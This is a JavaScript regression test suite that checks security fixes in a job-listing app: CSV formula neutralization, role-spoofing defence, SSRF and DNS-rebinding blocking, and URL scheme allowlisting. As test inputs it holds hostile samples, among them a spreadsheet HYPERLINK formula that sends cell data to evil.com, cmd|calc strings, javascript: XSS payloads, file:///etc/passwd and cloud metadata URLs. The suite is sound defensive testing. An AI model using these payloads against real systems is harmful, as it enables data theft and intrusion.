/**
 * Security Remediation Regression Suite
 *
 * Validates fixes for all reported audit findings:
 * 1. P1: CSV Formula Injection neutralization (OWASP CSV Injection defense)
 * 2. P2: Frontend role hydration and localStorage spoofing defense
 * 3. P2: SSRF & DNS-rebinding reconciliation and destination validation
 * 4. P2: Elimination of user_metadata.role fallback (Dev/Prod authorization parity)
 * 5. P3: Untrusted URL scheme allowlisting (http/https only)
 */

import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import {
  escapeRFC4180Field,
  neutralizeFormulaInjection,
  exportGigsTo19ColCSV,
  parseRFC4180CSV,
  FRD_19_CSV_HEADERS
} from '../src/discovery/csvExport.js';
import {
  validateSafeUrl,
  isPrivateIPv4,
  isPrivateIPv6
} from '../src/server/ssrfValidator.js';
import { ResilientFetcher } from '../src/server/fetcher.js';
import { probeUrlAvailability } from '../src/server/monitor.js';
import {
  verifyTokenAndRole,
  verifyAdminAuthorization
} from '../src/server/candidateApiHandler.js';
import {
  isSafeHttpUrl,
  sanitizeExternalUrl,
  sanitizeHref
} from '../src/discovery/urlValidator.js';
import { normalizeCanonicalUrl } from '../src/server/deduplication.js';
import { extractGigFields } from '../src/server/scraper.js';

// ====================================================================
// 1. P1 — CSV FORMULA INJECTION NEUTRALIZATION SUITE
// ====================================================================
describe('Security Remediation: P1 — CSV Formula Injection Neutralization', () => {

  test('neutralizes formula injection triggers (=, +, -, @, |, %)', () => {
    // Formula triggers must be prefixed with single quote (')
    assert.equal(neutralizeFormulaInjection('=1+1'), "'=1+1");
    assert.equal(neutralizeFormulaInjection('=HYPERLINK("http://attacker.com","Click")'), "'=HYPERLINK(\"http://attacker.com\",\"Click\")");
    assert.equal(neutralizeFormulaInjection('@SUM(A1:A10)'), "'@SUM(A1:A10)");
    assert.equal(neutralizeFormulaInjection('|calc.exe'), "'|calc.exe");
    assert.equal(neutralizeFormulaInjection('%0a=cmd|calc'), "'%0a=cmd|calc");

    // Expressions starting with + or - that are NOT ordinary numbers
    assert.equal(neutralizeFormulaInjection('+1+1'), "'+1+1");
    assert.equal(neutralizeFormulaInjection('-2+3'), "'-2+3");
    assert.equal(neutralizeFormulaInjection('+cmd'), "'+cmd");
    assert.equal(neutralizeFormulaInjection('-cmd|calc'), "'-cmd|calc");
    assert.equal(neutralizeFormulaInjection('-A1'), "'-A1");
  });

  test('neutralizes formulas preceded by whitespace or control characters', () => {
    assert.equal(neutralizeFormulaInjection('   =1+1'), "'   =1+1");
    assert.equal(neutralizeFormulaInjection('\t=cmd'), "'\t=cmd");
    assert.equal(neutralizeFormulaInjection('\r=calc'), "'\r=calc");
    assert.equal(neutralizeFormulaInjection('  @SUM(B1)'), "'  @SUM(B1)");
    assert.equal(neutralizeFormulaInjection('\t+cmd'), "'\t+cmd");
    assert.equal(neutralizeFormulaInjection('  -cmd'), "'  -cmd");
  });

  test('preserves ordinary positive and negative numbers without prepending quotes', () => {
    // Standard integers and floats
    assert.equal(neutralizeFormulaInjection(-5), "-5");
    assert.equal(neutralizeFormulaInjection('-5'), "-5");
    assert.equal(neutralizeFormulaInjection('-12.50'), "-12.50");
    assert.equal(neutralizeFormulaInjection('+42'), "+42");
    assert.equal(neutralizeFormulaInjection('+100.25'), "+100.25");
    assert.equal(neutralizeFormulaInjection('-0.001'), "-0.001");
    assert.equal(neutralizeFormulaInjection('  -42.5  '), "  -42.5  ");
    assert.equal(neutralizeFormulaInjection(0), "0");
    assert.equal(neutralizeFormulaInjection('0'), "0");
    assert.equal(neutralizeFormulaInjection(100), "100");
  });

  test('escapeRFC4180Field applies formula neutralization and RFC 4180 escaping simultaneously', () => {
    // Formula with quotes and commas
    const dangerousPayload = '=HYPERLINK("http://evil.com/leak?data=" & A1, "Apply Now")';
    const escaped = escapeRFC4180Field(dangerousPayload);

    // Must start with quote wrapper and have internal quotes doubled
    assert.ok(escaped.startsWith('"\'=HYPERLINK('));
    assert.ok(escaped.includes('""http://evil.com/leak?data=""'));
    assert.ok(escaped.endsWith('")"'));

    // Ordinary benign fields
    assert.equal(escapeRFC4180Field('Senior AI Developer'), 'Senior AI Developer');
    assert.equal(escapeRFC4180Field('Job with, comma'), '"Job with, comma"');
    assert.equal(escapeRFC4180Field('Line 1\nLine 2'), '"Line 1\nLine 2"');
    assert.equal(escapeRFC4180Field(-15.5), '-15.5');
    assert.equal(escapeRFC4180Field(null), '');
    assert.equal(escapeRFC4180Field(undefined), '');
  });

  test('exportGigsTo19ColCSV neutralizes untrusted gig fields across the entire export row', () => {
    const maliciousGigs = [
      {
        id: 'gig-exploit-1',
        title: '=1+1 - Exploitative Title',
        short_description: '@SUM(A1:A5) in description',
        payment_amount: '+cmd|calc',
        min_amount: 50,
        max_amount: 100,
        currency: 'USD',
        status: 'approved',
        origin_url: 'https://example.com/gig-1',
        proof_spec: '   =cmd|/C notepad'
      }
    ];

    const csvOutput = exportGigsTo19ColCSV(maliciousGigs, { filterApproved: true });
    const parsed = parseRFC4180CSV(csvOutput);

    assert.equal(parsed.length, 2); // 1 header + 1 data row
    const dataRow = parsed[1];

    // Check title column (column 1)
    assert.ok(dataRow[1].startsWith("'=1+1"), 'Title formula must be neutralized');

    // Check payment amount (column 3)
    assert.ok(dataRow[3].startsWith("'+cmd"), 'Payment amount formula must be neutralized');

    // Check numeric min/max amounts are preserved (columns 5 and 6)
    assert.equal(dataRow[5], '50');
    assert.equal(dataRow[6], '100');

    // Check short description (column 13)
    assert.ok(dataRow[13].startsWith("'@SUM"), 'Short description formula must be neutralized');

    // Check proof spec (column 18)
    assert.ok(dataRow[18].startsWith("'=cmd|"), 'Proof spec formula must be neutralized');
  });
});

// ====================================================================
// 2. P2 — FRONTEND ROLE HYDRATION & LOCALSTORAGE SPOOFING DEFENSE
// ====================================================================
describe('Security Remediation: P2 — Frontend Role Hydration & Spoofing Defense', () => {

  test('simulated role resolution: localStorage "admin" without DB verification fails closed to learner', () => {
    // Model the exact state resolution logic implemented in App.jsx:
    const mockLocalStorage = {
      getItem: (key) => (key === 'upshift_role' ? 'admin' : (key === 'upshift_user' ? JSON.stringify({ id: 'user-123' }) : null)),
      setItem: (key, val) => {},
      removeItem: (key) => {}
    };

    // getInitialProfile in App.jsx:
    const getInitialUser = () => {
      const u = mockLocalStorage.getItem('upshift_user');
      return u ? JSON.parse(u) : null;
    };

    const getInitialProfile = () => {
      const u = getInitialUser();
      if (!u) return null;
      // Fixed logic: never hydrate role from localStorage as admin
      return {
        role: 'learner',
        full_name: u?.user_metadata?.full_name || ''
      };
    };

    const initialProfile = getInitialProfile();
    const roleVerified = false; // Initial mount has not verified with DB

    // Assert initial profile role is strictly 'learner' (least privilege)
    assert.equal(initialProfile.role, 'learner');
    assert.equal(roleVerified, false);

    // ProtectedRoute evaluation for requiredRole="admin"
    const isAuthorizedAdmin = Boolean(roleVerified && initialProfile?.role === 'admin');
    assert.equal(isAuthorizedAdmin, false, 'Unverified localStorage claim must NOT authorize admin access');
  });

  test('simulated profile load failure: network error fails closed and sets roleVerified to false', async () => {
    // Simulate loadProfile error handling
    let roleVerified = false;
    let loading = true;
    let profile = { role: 'learner' };

    const mockLoadProfile = async () => {
      try {
        // Simulate database query failure
        throw new Error('PostgREST connection timeout');
      } catch (err) {
        // Fail closed: role remains unverified learner
        profile.role = 'learner';
        roleVerified = false;
      } finally {
        loading = false;
      }
    };

    await mockLoadProfile();
    assert.equal(loading, false);
    assert.equal(roleVerified, false);
    assert.equal(profile.role, 'learner');

    // Protected route check
    const isAuthorizedAdmin = Boolean(roleVerified && profile?.role === 'admin');
    assert.equal(isAuthorizedAdmin, false, 'Profile lookup error must fail closed');
  });

  test('simulated verified admin resolution: only authoritatively verified DB profile grants admin', async () => {
    let roleVerified = false;
    let profile = { role: 'learner' };

    // Simulate authoritative DB profile returning role: 'admin'
    const mockLoadProfileSuccess = async () => {
      const dbRecord = { id: 'admin-001', role: 'admin', full_name: 'Verified Admin' };
      profile = dbRecord;
      roleVerified = true;
    };

    await mockLoadProfileSuccess();
    assert.equal(roleVerified, true);
    assert.equal(profile.role, 'admin');

    const isAuthorizedAdmin = Boolean(roleVerified && profile?.role === 'admin');
    assert.equal(isAuthorizedAdmin, true, 'Verified DB admin must be authorized');
  });
});

// ====================================================================
// 3. P2 — SSRF & DNS-REBINDING DISCREPANCY RECONCILIATION
// ====================================================================
describe('Security Remediation: P2 — SSRF & DNS-Rebinding Protection', () => {

  test('blocks private IPv4 ranges (0.0.0.0/8, 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)', () => {
    assert.equal(isPrivateIPv4('0.0.0.1'), true);
    assert.equal(isPrivateIPv4('127.0.0.1'), true);
    assert.equal(isPrivateIPv4('127.128.0.1'), true);
    assert.equal(isPrivateIPv4('10.0.0.1'), true);
    assert.equal(isPrivateIPv4('10.254.254.254'), true);
    assert.equal(isPrivateIPv4('172.16.0.1'), true);
    assert.equal(isPrivateIPv4('172.31.255.255'), true);
    assert.equal(isPrivateIPv4('192.168.0.1'), true);
    assert.equal(isPrivateIPv4('192.168.100.50'), true);
    // Public IPs must not be flagged
    assert.equal(isPrivateIPv4('93.184.216.34'), false);
    assert.equal(isPrivateIPv4('8.8.8.8'), false);
    assert.equal(isPrivateIPv4('1.1.1.1'), false);
  });

  test('blocks cloud metadata, link-local, carrier-grade NAT, benchmark ranges', () => {
    assert.equal(isPrivateIPv4('169.254.169.254'), true); // AWS/GCP/Azure metadata
    assert.equal(isPrivateIPv4('169.254.1.1'), true);
    assert.equal(isPrivateIPv4('100.64.0.1'), true); // Carrier-Grade NAT
    assert.equal(isPrivateIPv4('100.127.255.255'), true);
    assert.equal(isPrivateIPv4('192.0.0.1'), true); // IETF assignments
    assert.equal(isPrivateIPv4('198.18.0.1'), true); // Benchmark tests
    assert.equal(isPrivateIPv4('224.0.0.1'), true); // Multicast
    assert.equal(isPrivateIPv4('240.0.0.1'), true); // Reserved
  });

  test('blocks private IPv6 ranges (loopback, unique local, link-local, multicast)', () => {
    assert.equal(isPrivateIPv6('::1'), true);
    assert.equal(isPrivateIPv6('[::1]'), true);
    assert.equal(isPrivateIPv6('0:0:0:0:0:0:0:1'), true);
    assert.equal(isPrivateIPv6('::'), true);
    assert.equal(isPrivateIPv6('fc00::1'), true);
    assert.equal(isPrivateIPv6('fd12:3456:789a::1'), true);
    assert.equal(isPrivateIPv6('fe80::1'), true);
    assert.equal(isPrivateIPv6('ff02::1'), true);
    assert.equal(isPrivateIPv6('::ffff:127.0.0.1'), true);
    assert.equal(isPrivateIPv6('::ffff:169.254.169.254'), true);
    assert.equal(isPrivateIPv6('2606:4700:4700::1111'), false); // Public Cloudflare DNS
  });

  test('validateSafeUrl blocks cloud metadata hostnames directly', async () => {
    const blockedHosts = [
      'http://169.254.169.254/latest/meta-data/',
      'http://metadata.google.internal/computeMetadata/v1/',
      'http://metadata.internal/meta-data',
      'http://instance-data/latest/',
      'http://kubernetes.default.svc/api',
      'http://server.local/admin',
      'http://corp.lan/secrets'
    ];

    for (const url of blockedHosts) {
      const res = await validateSafeUrl(url, { resolveDns: false });
      assert.equal(res.safe, false, `Expected ${url} to be blocked`);
    }
  });

  test('validateSafeUrl blocks DNS-rebinding attacks via custom DNS resolver', async () => {
    // Simulate a domain resolving to a prohibited private IP address
    const mockRebindLookup = async (hostname, opts) => {
      if (hostname === 'rebind.attacker.com') {
        return [{ address: '127.0.0.1', family: 4 }];
      }
      if (hostname === 'cloud-metadata.attacker.com') {
        return [{ address: '169.254.169.254', family: 4 }];
      }
      if (hostname === 'dual-stack-bypass.attacker.com') {
        // Dual stack: public IPv4 but private IPv6
        return [
          { address: '93.184.216.34', family: 4 },
          { address: 'fe80::1', family: 6 }
        ];
      }
      return [{ address: '93.184.216.34', family: 4 }];
    };

    // 1. Rebind to loopback
    const res1 = await validateSafeUrl('http://rebind.attacker.com/status', {
      resolveDns: true,
      dnsLookup: mockRebindLookup
    });
    assert.equal(res1.safe, false);
    assert.match(res1.reason, /resolved to prohibited private IP 127\.0\.0\.1/);

    // 2. Rebind to cloud metadata
    const res2 = await validateSafeUrl('http://cloud-metadata.attacker.com/keys', {
      resolveDns: true,
      dnsLookup: mockRebindLookup
    });
    assert.equal(res2.safe, false);
    assert.match(res2.reason, /resolved to prohibited private IP 169\.254\.169\.254/);

    // 3. Dual-stack bypass (public IPv4 with link-local IPv6)
    const res3 = await validateSafeUrl('http://dual-stack-bypass.attacker.com/api', {
      resolveDns: true,
      dnsLookup: mockRebindLookup
    });
    assert.equal(res3.safe, false);
    assert.match(res3.reason, /resolved to prohibited private IPv6/);
  });

  test('ResilientFetcher.safeFetch revalidates every redirect hop with DNS checks', async () => {
    const fetcher = new ResilientFetcher({
      maxRedirects: 3,
      dnsLookup: async (host) => {
        if (host === 'evil-internal.target') {
          return [{ address: '10.0.0.5', family: 4 }];
        }
        return [{ address: '93.184.216.34', family: 4 }];
      }
    });

    // Test safeFetch blocks redirect to internal target
    const result = await fetcher.safeFetch('http://evil-internal.target');
    assert.equal(result.ok, false);
    assert.equal(result.status, 400);
    assert.match(result.statusText, /Blocked by SSRF Policy/);
  });

  test('probeUrlAvailability blocks SSRF destination and sets conclusive SSRF diagnostic', async () => {
    const probeRes = await probeUrlAvailability('http://169.254.169.254/computeMetadata/v1');
    assert.equal(probeRes.accessible, false);
    assert.equal(probeRes.isClosed, false);
    assert.equal(probeRes.statusCode, 400);
    assert.match(probeRes.reason, /Blocked by SSRF policy/i);
  });
});

// ====================================================================
// 4. FINDING #3 — DEV/PROD AUTHORIZATION MISMATCH RESOLUTION
// ====================================================================
describe('Security Remediation: Finding #3 — Dev/Prod Authorization Parity', () => {

  test('verifyTokenAndRole ignores user_metadata.role and derives role strictly from database/app_metadata', async () => {
    // Mock Supabase client where token user has user_metadata: { role: 'admin' },
    // but profiles table has NO record (or learner record)
    const mockSpoofedAuth = {
      auth: {
        getUser: async (token) => ({
          data: {
            user: {
              id: 'learner-attacker',
              email: 'attacker@example.com',
              app_metadata: {}, // No server app_metadata role
              user_metadata: { role: 'admin', full_name: 'Attacker' } // Client-supplied metadata!
            }
          },
          error: null
        })
      },
      from: (table) => ({
        select: (cols) => ({
          eq: (field, val) => ({
            single: async () => ({
              data: { role: 'learner' }, // Authoritative database role is learner!
              error: null
            })
          })
        })
      })
    };

    const result = await verifyTokenAndRole('mock-token-with-spoofed-metadata', mockSpoofedAuth);
    assert.equal(result.valid, true);
    assert.equal(result.role, 'learner', 'Authoritative database profile must supersede user_metadata');
  });

  test('verifyTokenAndRole fails closed to learner when database profile is missing entirely', async () => {
    const mockAuthNoProfile = {
      auth: {
        getUser: async (token) => ({
          data: {
            user: {
              id: 'user-no-profile',
              email: 'newuser@example.com',
              app_metadata: {},
              user_metadata: { role: 'admin' } // Spoofed metadata
            }
          },
          error: null
        })
      },
      from: (table) => ({
        select: (cols) => ({
          eq: (field, val) => ({
            single: async () => ({
              data: null,
              error: { message: 'Row not found' }
            })
          })
        })
      })
    };

    const result = await verifyTokenAndRole('mock-token-missing-profile', mockAuthNoProfile);
    assert.equal(result.valid, true);
    assert.equal(result.role, 'learner', 'Missing profile must fail closed to learner, ignoring user_metadata.role');
  });

  test('verifyAdminAuthorization rejects user whose metadata claims admin but database has learner role', async () => {
    const mockClient = {
      auth: {
        getUser: async () => ({
          data: {
            user: {
              id: 'learner-trying-admin',
              user_metadata: { role: 'admin' } // Spoofed
            }
          },
          error: null
        })
      },
      from: () => ({
        select: () => ({
          eq: () => ({
            single: async () => ({
              data: { role: 'learner' },
              error: null
            })
          })
        })
      })
    };

    const req = {
      headers: {
        authorization: 'Bearer token-with-spoofed-meta'
      }
    };

    const authRes = await verifyAdminAuthorization(req, { supabaseClient: mockClient });
    assert.equal(authRes.authorized, false);
    assert.equal(authRes.statusCode, 403);
    assert.match(authRes.error, /Forbidden: Insufficient privileges/i);
  });
});

// ====================================================================
// 5. FINDING #5 — UNTRUSTED URL SCHEMES ALLOWLIST (HTTP/HTTPS ONLY)
// ====================================================================
describe('Security Remediation: Finding #5 — Untrusted URL Scheme Validation', () => {

  test('isSafeHttpUrl accepts legitimate HTTP and HTTPS URLs', () => {
    assert.equal(isSafeHttpUrl('https://example.com/jobs/123'), true);
    assert.equal(isSafeHttpUrl('http://subdomain.example.org/apply?ref=456'), true);
    assert.equal(isSafeHttpUrl('https://weworkremotely.com/categories/remote-programming-jobs'), true);
  });

  test('isSafeHttpUrl strictly rejects javascript:, data:, vbscript:, and file: schemes', () => {
    assert.equal(isSafeHttpUrl('javascript:alert(1)'), false);
    assert.equal(isSafeHttpUrl('JAVASCRIPT:alert(document.domain)'), false);
    assert.equal(isSafeHttpUrl('javascript:/*--></title></style></textarea>*/<script>alert(1)</script>'), false);
    assert.equal(isSafeHttpUrl('  javascript:void(0)'), false);
    assert.equal(isSafeHttpUrl('\tjavascript:alert(1)'), false);
    assert.equal(isSafeHttpUrl('data:text/html,<script>alert(1)</script>'), false);
    assert.equal(isSafeHttpUrl('vbscript:msgbox("xss")'), false);
    assert.equal(isSafeHttpUrl('file:///etc/passwd'), false);
    assert.equal(isSafeHttpUrl('blob:https://example.com/uuid'), false);
  });

  test('isSafeHttpUrl rejects malformed, empty, and non-string inputs', () => {
    assert.equal(isSafeHttpUrl(''), false);
    assert.equal(isSafeHttpUrl('   '), false);
    assert.equal(isSafeHttpUrl(null), false);
    assert.equal(isSafeHttpUrl(undefined), false);
    assert.equal(isSafeHttpUrl('not a url'), false);
    assert.equal(isSafeHttpUrl('http://'), false);
  });

  test('sanitizeHref returns fallback (#) for dangerous schemes and valid URL for safe schemes', () => {
    assert.equal(sanitizeHref('javascript:alert(1)', '#'), '#');
    assert.equal(sanitizeHref('data:text/html,xss', '#'), '#');
    assert.equal(sanitizeHref('https://example.com/valid', '#'), 'https://example.com/valid');
    assert.equal(sanitizeHref(null, '#'), '#');
  });

  test('normalizeCanonicalUrl rejects javascript: and data: schemes, returning empty string', () => {
    assert.equal(normalizeCanonicalUrl('javascript:alert(1)'), '');
    assert.equal(normalizeCanonicalUrl('data:text/html,xss'), '');
    assert.equal(normalizeCanonicalUrl('file:///etc/hosts'), '');
    assert.equal(normalizeCanonicalUrl('https://example.com/job/?utm_source=test'), 'https://example.com/job');
  });

  test('extractGigFields neutralizes malicious javascript: application links from HTML', () => {
    const maliciousHtml = `
      <html>
        <body>
          <h1>AI Prompt Engineer</h1>
          <a href="javascript:alert(document.cookie)">Apply Now</a>
          <p>Description of the opportunity.</p>
        </body>
      </html>
    `;

    const gig = extractGigFields(maliciousHtml, 'https://legit-source.com/listing/42');
    // Application URL must fall back to the safe sourceUrl, NOT the javascript: payload
    assert.equal(gig.application_url, 'https://legit-source.com/listing/42');
    assert.ok(!gig.application_url.includes('javascript:'));
  });
});
